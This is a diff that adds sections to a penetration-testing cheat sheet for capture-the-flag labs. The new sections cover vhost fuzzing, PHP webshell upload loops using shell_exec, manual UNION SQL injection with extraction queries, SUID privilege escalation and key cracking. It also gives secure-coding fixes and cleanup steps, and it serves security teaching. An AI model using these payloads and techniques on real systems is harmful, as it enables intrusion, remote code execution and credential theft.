@@ -92,6 +92,59 @@ echo "$IP <vhost> <vhost2>" | sudo tee -a /etc/hosts
 
 **Or override per-request (no root) — see curl `--resolve` below.**
 
+### 4.1 Vhost fuzzing — and the baseline trap that hides the answer
+
+```bash
+ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt \
+     -H "Host: FUZZ.<domain>" -u http://$IP/ -fc 302 -t 25
+```
+`FUZZ` goes in the **header**, not the URL: the URL stays pinned to the IP and only the `Host:`
+changes. Note `-u http://$IP/` — **`ffuf` has no `--resolve`**, so a hostname in the URL is handed
+to the system resolver and every request dies at DNS before it leaves your machine.
+
+**Baseline first — but baseline on the right field.** The usual probe prints status and size:
+
+```bash
+curl -s -o /dev/null -w '%{http_code}:%{size_download}\n' -H "Host: zzz.<domain>" http://$IP/
+```
+
+That is not always enough. Apache's default vhost and a real application can both answer
+`302` with a zero-byte body, and then status+size cannot tell them apart:
+
+| Host | Status | Size | `Location` |
+|---|---|---|---|
+| `zzz.olympus.thm` (miss) | 302 | 0 | `http://olympus.thm` — **absolute**, the default-vhost bounce |
+| `chat.olympus.thm` (hit) | 302 | 0 | `login.php` — **relative**, an application redirect |
+
+Filtering `-fc 302` throws the hit away. **Always include the redirect target in your probe:**
+
+```bash
+curl -s -o /dev/null -w '%{http_code}:%{size_download}:%{redirect_url}\n' -H "Host: FUZZ.<domain>" http://$IP/
+```
+In ffuf, either keep the 302s and read them, or filter on the bounce URL instead of the code:
+```bash
+ffuf ... -mc all -fr 'http://<domain>/?$'      # -fr = filter by regex on the response
+ffuf ... -L                                     # or follow redirects so the bodies really differ
+```
+
+> **The rule:** a baseline is only as good as the field you compare. Status and size are the
+> defaults because they are convenient, not because they are sufficient. When a sweep finds
+> nothing, ask whether your filter can even **express** the difference you are hunting for,
+> before you reach for a bigger wordlist.
+
+### 4.2 Vhosts are not the only hidden site
+
+If subdomain fuzzing comes up empty, the "other site" may not be a subdomain at all:
+
+| Where else a second site hides | How you find it |
+|---|---|
+| `mod_userdir` — `/~<user>/` → `/home/<user>/public_html/` | shows up in a **directory** sweep, never a subdomain one |
+| the **default vhost** docroot (`/var/www/html`) | what you get when `Host:` matches nothing |
+| a path on the same vhost (`/old/`, `/v1/`) | ordinary directory sweep |
+
+`/~webmaster/` is easy to dismiss as Debian packaging noise. **Open it anyway** — it is a
+different filesystem tree, often running an app nobody remembers deploying.
+
 ---
 
 ## 5. curl — the web workhorse
@@ -352,6 +405,69 @@ curl -sk --resolve <vhost>:443:$IP 'https://<vhost>/<uploads-dir>/shell.php?c=ca
 curl -sk --resolve <vhost>:443:$IP 'https://<vhost>/<uploads-dir>/shell.php?c=rm%20/full/path/shell.php'
 ```
 
+### 8.1 Test the handler the form actually posts to
+
+An app can ship **two** upload files: a careful one and the one that runs. Fetching a validator
+directly with no session and no file makes it print its whole decision tree:
+
+```bash
+curl -s http://$IP/upload.php
+# Sorry, file already exists.
+# Sorry, only JPG, JPEG, PNG & GIF files are allowed.
+# Sorry, your file was not uploaded.
+```
+That is a free specification of the filter — but only of **that file's** filter. If the form posts
+to `home.php`, the checks in `upload.php` never execute. Read the form's `action=` and attack that:
+
+```bash
+curl -s http://$IP/<page> | grep -oE '<(form|input|button)[^>]*'
+```
+
+**Enumerate extensions empirically** rather than guessing at bypasses:
+```bash
+for n in s.php s.phtml s.php5 s.PHP s.php.gif s.gif.php s.pHp; do
+  printf 'GIF89a;\n<?php echo shell_exec($_REQUEST["c"]); ?>\n' > "$n"
+  curl -s -b cookies.jar -F "fileToUpload=@$n;type=image/gif" -F "submit=1" http://$IP/<handler>
+done
+```
+Then check what each one **became** on disk (a listing, a DB column, or the response). Often no
+bypass is needed at all — the whitelist simply is not on that code path.
+
+### 8.2 Renaming an upload is not sanitising it
+
+A very common pattern, and a vulnerable one:
+```php
+$FileType = strtolower(pathinfo($_FILES["f"]["name"], PATHINFO_EXTENSION));
+$name = md5(time()).'.'.$FileType;      // "random" name, ATTACKER-CONTROLLED extension
+```
+It controls the *name* and leaves the *type* to the attacker. Two separate bugs:
+
+- **The extension is echoed back from the client.** Derive it server-side from verified content.
+- **`md5(time())` is not random.** `time()` is public and second-granular: a whole day is 86,400
+  MD5s (< 1 s to brute-force), and two uploads in the same second silently overwrite each other.
+
+```bash
+# confirm the scheme experimentally: upload, note the clock, read back the stored name
+T0=$(date +%s); curl -s -F "fileToUpload=@probe.gif" ... ; T1=$(date +%s)
+for t in $(seq $((T0-60)) $((T1+60))); do
+  [ "$(printf '%s' $t | md5sum | cut -d' ' -f1)" = "<stored-hash>" ] && echo "md5(time()) confirmed: $t"
+done
+```
+
+**The fix:**
+```php
+$allowed = ['image/jpeg'=>'jpg','image/png'=>'png','image/gif'=>'gif'];
+$mime = (new finfo(FILEINFO_MIME_TYPE))->file($_FILES['f']['tmp_name']);
+if (!isset($allowed[$mime])) { /* reject */ }
+$name = bin2hex(random_bytes(16)) . '.' . $allowed[$mime];
+```
+…and disable PHP execution in the upload directory entirely. **Unguessable names need unguessable
+inputs, not hashed public ones.**
+
+> **Check you can REACH an upload before crafting a payload for it.** If the whole directory is
+> `403` (Apache `Require all denied`), nothing you upload there is reachable whatever it contains.
+> One `curl` against a file you know exists (`/img/img.jpg`) settles it in five seconds.
+
 ---
 
 ## 9. Credentials & hashes
@@ -375,9 +491,22 @@ hashcat -m <mode> -a 0 hash.txt /usr/share/wordlists/rockyou.txt
 
 **Crack with John (auto-detects type):**
 ```bash
-john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
-john --show hash.txt
+john --format=bcrypt --wordlist=rockyou.txt hash.txt   # be explicit; autodetect can pick wrong
+john --show --format=bcrypt hash.txt
+john --session=<name> ...                              # REQUIRED for a 2nd concurrent job,
+                                                       # else: "Crash recovery file is locked"
 ```
+**`*2john` — turn any artefact into a crackable hash:**
+```bash
+ssh2john id_rsa > key.hash          # encrypted SSH private key -> passphrase
+zip2john f.zip > z.hash             # password-protected archive
+keepass2john f.kdbx > k.hash
+# then: john --wordlist=rockyou.txt <hash>
+```
+
+> **Offline cracking is not login-page bruteforce.** Rooms that ban "bruteforcing any login page"
+> still expect this: it runs on your machine, sends the target zero packets, and triggers no
+> lockout. Know the difference and say which one you did.
 
 **Verify a bcrypt guess without cracking (Python):**
 ```bash
@@ -448,9 +577,16 @@ curl http://<attacker-ip>:<port>/file -o file
                 app silent? attack the MIDDLEWARE, not the handler — malformed JSON (§16.5)
 5. POST-EXPLOIT got file read? get a LISTING first (.git/index, /proc, syslog — §17)
                 read configs+source, dump DBs, crack hashes, escalate user→admin→root
+                shell? find / -perm -4000 and check what ISN'T stock (§19)
 6. VERIFY       confirm each finding a 2nd way; separate VERIFIED from ASSUMED; keep dead ends
                 a payload that "should" work and doesn't: re-test it before theorising
+7. CLEAN UP     remove every shell, temp file, injected row and key you added — then PROVE
+                your access is gone (§20.2)
 ```
+
+**Recurring shape: one credential unlocks the next stage.** DB → hashes → crack one weak password
+→ that password is reused on a second app → upload → RCE → SUID binary → user → backdoor → root.
+At every step, ask *what does this let me read*, then *who else uses that value*.
 
 ---
 
@@ -847,6 +983,272 @@ That listing is what finds files no wordlist ever will — `public/100375.yaml`,
 
 ---
 
+---
+
+## 18. SQL injection — UNION-based, end to end
+
+The one class `sqlmap` will do for you and you must still be able to do by hand. Worked example:
+a search form, `POST search=<input>`.
+
+### 18.1 Detect: one character
+
+```bash
+curl -s -X POST -d "search=a&submit=1"  http://$IP/<endpoint> | wc -c    # 8360  baseline
+curl -s -X POST -d "search='&submit=1"  http://$IP/<endpoint> | wc -c    # 2671  something broke
+```
+A single quote is the whole test. **Compare response sizes, not eyeballs** — the difference shows
+up as a byte count before you read a word of HTML.
+
+### 18.2 Read the error — it hands you the query shape
+
+```
+You have an error in your SQL syntax; ... near '%' AND post_status='publish'' at line 1
+```
+That tail tells you the input sits inside a `LIKE '%…%'`:
+```sql
+SELECT ... FROM posts WHERE post_tags LIKE '%<INPUT>%' AND post_status='publish'
+```
+So the break-out is `%'` — close the wildcard **and** the quote — then your SQL, then a comment.
+
+| Context you land in | Break-out prefix |
+|---|---|
+| `WHERE col = '<in>'` | `'` |
+| `WHERE col LIKE '%<in>%'` | `%'` |
+| `WHERE id = <in>` (numeric) | nothing — inject directly |
+| `ORDER BY <in>` | nothing; only `ASC/DESC`, column numbers, subqueries work |
+
+**Comment syntax:** use `-- -` (dash dash space dash). MySQL requires whitespace after `--`, and a
+plain trailing space gets stripped in transit; the extra `-` guarantees it survives. `#` works too
+but must be URL-encoded as `%23`.
+
+### 18.3 Count the columns
+
+```bash
+for n in $(seq 1 30); do   # go to 30, not 10 — see the warning below
+  ... "a%' ORDER BY $n-- -" ...
+done
+```
+`ORDER BY n` succeeds while `n` ≤ column count, then errors `Unknown column 'n' in 'order clause'`.
+
+> **Trap:** if every value in your loop passes, that is **not** proof the injection failed — your
+> range may just be too short. Send one deliberately absurd value (`ORDER BY 100`) to prove the
+> mechanism errors at all. *Test the instrument before you doubt the result.*
+
+### 18.4 Find which columns are printed
+
+```
+search=zzznope%' UNION SELECT 'c1','c2','c3','c4','c5','c6','c7','c8','c9','c10'-- -
+```
+Use a search term that matches **nothing** (`zzznope`) so the only rows on the page are yours.
+Then read the HTML and see where each marker landed. Pick a column that sits alone inside a
+distinctive tag and is **not truncated** by the template.
+
+### 18.5 The extraction one-liner
+
+```bash
+Q() {
+  curl -s -X POST --data-urlencode "search=zzznope%' UNION SELECT 1,2,($1),4,5,6,7,8,9,10-- -" \
+    -d "submit=1" "http://$IP/<endpoint>" \
+  | grep -oP '(?<=<h2><a href="#">).*?(?=</a></h2>)'
+}
+Q "database()"
+```
+| Piece | Why it matters |
+|---|---|
+| `--data-urlencode` | **mandatory.** The payload contains `%`, `'`, `&`, `+`. A raw `%` in a POST body reads as the start of a percent-escape and silently corrupts the payload |
+| `($1)` in a column slot | parentheses let a whole `SELECT … FROM …` subquery sit where a column goes |
+| `grep -oP '(?<=A).*?(?=B)'` | Perl lookarounds — match *between* two fixed strings, print only the middle |
+
+### 18.6 Enumerate
+
+```sql
+database()                                                     -- current DB
+user()                                                         -- DB user (privilege hint)
+@@version
+SELECT group_concat(schema_name) FROM information_schema.schemata
+SELECT group_concat(table_name)  FROM information_schema.tables  WHERE table_schema=database()
+SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='<table>'
+SELECT group_concat(col1,'|',col2 SEPARATOR ' ### ') FROM <db>.<table>
+```
+`group_concat()` is the whole trick: a UNION column returns **one** value, and `group_concat`
+collapses an entire result set into it. One request per question, not one per row.
+
+> Always add `AND table_schema='<db>'` when querying `information_schema.columns` — without it you
+> get same-named tables from `mysql`/`performance_schema` mixed into your column list.
+
+### 18.7 When the output comes back empty
+
+Long or HTML-bearing values break the extraction (they contain the tags you grep between, or blow
+past `group_concat_max_len`, default 1024). Fixes, in order:
+
+```sql
+SELECT LENGTH(col) FROM t WHERE id=1                       -- how big is it really?
+SELECT SUBSTRING(HEX(col), 1, 200) FROM t WHERE id=1       -- hex chunks, reassemble locally
+SELECT REPLACE(REPLACE(col,'<','['),'>',']') FROM t        -- neutralise the tags
+```
+```bash
+# pull it in 200-hex-char slices, then decode
+for off in 1 201 401 601; do ... "SELECT SUBSTRING(HEX(col),$off,200) ..." ; done
+echo "$hex" | xxd -r -p
+```
+`TO_BASE64()` is tidier but is not always available; `HEX()` always is.
+
+### 18.8 Can you read files? (usually no)
+
+```sql
+SELECT group_concat(grantee) FROM information_schema.user_privileges WHERE privilege_type='FILE'
+SELECT LOAD_FILE('/etc/hostname')
+SELECT @@secure_file_priv
+```
+`LOAD_FILE` needs the **FILE** privilege *and* a permissive `secure_file_priv`. A web app's DB user
+almost never has it — check in one request rather than assuming either way.
+
+### 18.9 The fix (for the report)
+
+```php
+$stmt = $pdo->prepare("SELECT * FROM posts WHERE post_tags LIKE CONCAT('%', ?, '%') AND post_status='publish'");
+$stmt->execute([$search]);
+```
+**Bind the value; never interpolate it.** Note the wildcards live in the *SQL*, not in the
+parameter — so the user cannot supply their own quote to escape with. Escaping functions
+(`mysqli_real_escape_string`) are a fallback, not a fix.
+
+---
+
+## 19. Linux privilege escalation — SUID binaries
+
+```bash
+find / -perm -4000 -type f 2>/dev/null | sort
+```
+| Piece | Meaning |
+|---|---|
+| `-perm -4000` | the **setuid** bit is set (`-` = "at least these bits") |
+| `-type f` | regular files only |
+| `2>/dev/null` | drop the permission-denied noise |
+
+Ignore the stock list (`sudo mount su passwd pkexec chfn chsh gpasswd newgrp at fusermount
+umount`, plus `/snap/...` copies). **Anything else is the finding.** Confirm with the package
+manager — a setuid file the distro does not own is an incident:
+
+```bash
+dpkg -S /usr/bin/<suspect>      # "no path found" = not from any package
+ls -la /usr/bin/<suspect>       # rws = setuid; the OWNER is who you become
+```
+
+### 19.1 Read it before you run it
+
+```bash
+file <bin>; strings <bin> | head -40
+```
+Prompts, format strings and libc imports (`fopen`, `system`, `execve`) tell you what it does
+without a disassembler.
+
+### 19.2 `system()` in a setuid binary — often NOT exploitable
+
+An unqualified command inside `system("figlet ...")` looks like a free PATH hijack:
+
+```bash
+mkdir -p /tmp/x && printf '#!/bin/bash\nid > /tmp/x/out\n' > /tmp/x/figlet
+chmod 755 /tmp/x/figlet
+PATH=/tmp/x:$PATH /usr/bin/<suid-bin>
+cat /tmp/x/out
+```
+Your script runs — **as your own user.** `system()` runs `/bin/sh -c`, and on Ubuntu `/bin/sh` is
+**dash**, which drops the effective UID back to the real one when `euid != uid` (bash does the same
+without `-p`). It is a deliberate, decades-old defence.
+
+> Still test it: it *is* exploitable when `/bin/sh` is old or unusual, or when the hijacked command
+> is reached through `execve`/`execlp` rather than a shell. Just do not assume it works — check
+> `id` from inside the hijack before building on it.
+
+### 19.3 The boring feature is usually the exploit
+
+If `system()` drops privileges, the file I/O does not. A setuid "copy a file" utility is an
+**arbitrary read and arbitrary write as its owner**:
+
+```bash
+printf "/etc/hostname\n/tmp/probe\n" | /usr/bin/<copy-bin>   # prove it works
+ls -la /tmp/probe            # owner column = the binary's owner => primitive confirmed
+```
+| Target you want | Why |
+|---|---|
+| `~<user>/.ssh/id_rsa` | private key — crack the passphrase offline (§19.4) |
+| `~<user>/.ssh/authorized_keys` | **write** your own key in — see the warning below |
+| `/etc/shadow` (if owner is root) | hashes |
+| any file the owner can read | config, source, secrets |
+
+**Target directory permissions matter.** Copying *into* a directory you own but the binary's owner
+does not (mode 755) fails. Use world-writable `/tmp`.
+
+> **Prefer the read.** Overwriting `authorized_keys` destroys the owner's real access if you do not
+> save the original. If you must write, **read the file out first, append, write it back** — and
+> restore it afterwards. Ask: *what does this privileged program let me do*, not *what was it
+> meant to do.*
+
+### 19.4 Crack an SSH key passphrase
+
+```bash
+ssh2john id_rsa > key.hash            # or: python3 /usr/share/john/ssh2john.py id_rsa > key.hash
+john --session=k --wordlist=rockyou.txt key.hash
+john --show key.hash                  # id_rsa:<passphrase>
+chmod 600 id_rsa && ssh -i id_rsa <user>@$IP
+```
+`aes256-ctr` / `bcrypt` in the key's base64 header means it is passphrase-encrypted.
+`chmod 600` is mandatory — ssh refuses a world-readable key.
+
+> Run concurrent John jobs with `--session=<name>`; otherwise the second one dies on
+> `Crash recovery file is locked`.
+
+### 19.5 Directory permission bits, read precisely
+
+| Bit on a **directory** | Grants |
+|---|---|
+| `r` | **list** the names inside |
+| `x` | **traverse** it and open a file **whose name you already know** |
+
+`drwxrwx--x root:zeus <dir>` means everyone can be *served* a file from it over HTTP while nobody
+outside the group can enumerate it. That is how a webroot directory survives every content sweep —
+and why reading the filesystem as the right user is the only way in. `--x` is not protection, it is
+a name you have not learned yet.
+
+---
+
+## 20. After root — collect, then clean up
+
+### 20.1 Find flags by FORMAT, not by filename
+
+```bash
+find / -iname "*flag*" 2>/dev/null                      # misses .b0nus.fl4g, secret.txt, ...
+grep -rhoaE "(flag|THM)\{[^}]{3,80}\}" / \
+  --exclude-dir=proc --exclude-dir=sys --exclude-dir=snap --exclude-dir=usr \
+  --binary-files=text 2>/dev/null | sort -u             # finds all of them
+grep -rlaE "<fragment>" / --binary-files=text 2>/dev/null   # then locate the one you can't place
+```
+| Flag | Why |
+|---|---|
+| `-h` / `-l` | values first, then locations — two passes beats one noisy one |
+| `-a` / `--binary-files=text` | flags live inside ELF binaries too (banners!) |
+| `--exclude-dir` | skip virtual filesystems and 40k kernel headers |
+
+**A filename can be obfuscated (`.b0nus.fl4g`); the answer format cannot.** Search for what the
+author could not change.
+
+### 20.2 Put the box back
+
+Track what you drop **as you drop it**, and remove all of it:
+
+```bash
+rm -f <uploads>/<your-webshells>            # a webshell you leave behind is YOUR vulnerability
+rm -rf /tmp/<your-scratch>
+grep -v "<your-key-comment>$" ~<user>/.ssh/authorized_keys > /tmp/.t && mv /tmp/.t ~<user>/.ssh/authorized_keys
+mysql -u <u> -p'<p>' <db> -e 'delete from <table> where <your rows>;'
+```
+Then **verify**, don't assume:
+```bash
+ssh -i <yourkey> -o BatchMode=yes root@$IP 'id'   # must be: Permission denied (publickey,password)
+```
+Remove your root access **last**. In an engagement, unremoved tooling is a finding against you.
+
 ### Quick habits that save time in the exam
 - `export IP=...` once; reuse `$IP` everywhere.
 - Always run **one** `nmap -p-` — never trust the default top-1000.
@@ -861,3 +1263,16 @@ That listing is what finds files no wordlist ever will — `public/100375.yaml`,
 - Two failed fixes resting on the same untested premise = go test the premise, not a third fix.
 - When a lab box misbehaves, the box is a suspect too. Re-run the exact request before building a
   theory on top of its failure.
+- **Put `%{redirect_url}` in every probe format.** Two different `302:0` responses can differ only
+  in `Location:` — that one header hid an entire vhost on Olympus (§4.1).
+- **Run a known-good control through every new command.** An empty result means "not there" *or*
+  "my request never arrived", and they look identical. `ffuf` has no `--resolve`: IP in the URL,
+  name in `-H "Host:"`, always.
+- Don't `2>/dev/null` a tool until you have watched it succeed once.
+- Keep threads sane (`-t 25`). If the target goes slow mid-engagement, suspect **your** traffic
+  first — a scan that knocks the box over costs you the box.
+- A `/~user/` path in a directory sweep is a whole second application. Open it.
+- Check you can **reach** an upload directory before crafting a payload for it.
+- With a shell: `find / -perm -4000 -type f` and ask which entries the package manager doesn't own.
+- With root: grep for the flag **format**, not the filename — `.b0nus.fl4g` beats `find -name "*flag*"`.
+- Remove every shell, key and temp file you created, then **prove** your access is gone.
